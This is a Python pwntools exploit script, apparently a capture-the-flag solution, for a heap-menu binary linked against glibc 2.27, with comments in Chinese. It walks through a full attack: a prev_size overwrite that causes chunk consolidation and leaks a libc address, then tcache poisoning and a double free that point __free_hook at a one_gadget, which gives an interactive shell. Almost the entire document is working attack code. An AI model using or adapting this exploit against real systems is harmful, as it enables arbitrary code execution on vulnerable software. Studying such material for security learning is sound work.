from pwn import*
context(arch='amd64', os='linux', log_level='debug', terminal=['tmux', 'splitw', '-h', '-p', '80'])
p = process('pwn')
libc=ELF('./libc-2.27.so')

def create(size, content):
    p.recvuntil('Your choice: ')
    p.send(b'1'.ljust(0x10, b'\x00'))
    p.recvuntil('Size:')
    p.send(bytes(str(size), 'utf-8').ljust(0x10, b'\x00'))
    p.recvuntil('Data:')
    p.send(content)
def show(index):
    p.recvuntil('Your choice: ')
    p.send(b'2'.ljust(0x10, b'\x00'))
    p.recvuntil('Index:')
    p.send(bytes(str(index), 'utf-8').ljust(0x10, b'\x00'))
def delete(index):
    p.recvuntil('Your choice: ')
    p.send(b'3'.ljust(0x10, b'\x00'))
    p.recvuntil('Index:')
    p.send(bytes(str(index), 'utf-8').ljust(0x10, b'\x00'))

# 泄露glibc地址
create(0x500, b'a')         # 用于合并的chunk
create(0x68,  b'a')         # 用于show的chunk
create(0x500 - 0x10, b'a')  # 用于合并的chunk
create(0x10,  b'a')         # 防止与top合并

delete(1)   # 放入unsorted bin，获取fd和bk，让unlink时不会崩溃
delete(0)   # 放入tcache

# 设置chunk3的prev_size为0x580，使其与chunk1合并
for i in range(6):
    create(0x68-i, b'a' * (0x68-i))
    delete(0)
create(0x68, b'a' * 0x60 + p16(0x510+0x70))

# 合并chunk1~chunk3
delete(2)

# 切割新的chunk，让剩下的chunk2和chunk3放入unsorted bin
create(0x500, b'a')
show(0) # 显示chunk2的fd指针
libc_base = u64(p.recv(6).ljust(0x8, b'\x00')) - (0x761130bebca0 - 0x761130800000)
__free_hook = libc_base + libc.symbols['__free_hook']
one_gadget = libc_base + 0x4f322
print('add = ' + hex(libc_base))
print('__free_hook = ' + hex(__free_hook))
print('one_gadget = ' + hex(one_gadget))

#0->chunk2
#1->chunk1

# set memory
tmp = [8, 7, 6, 5, 4, 3, 2, 1]
for i in tmp:
    create(0x68, b'a' * i)
    delete(2)
create(0x68, p64(__free_hook)) # chunk2

# 此时0和2都指向了chunk2

# double free设置free_hook指向one_gadget
# 注意，glibc-2.27中没有对count的检查
delete(0)
delete(2)
create(0x68, p64(__free_hook))
create(0x68, p64(__free_hook))
create(0x68, p64(one_gadget))

# 触发one_gadget
delete(0)

# gdb.attach(p)

p.interactive()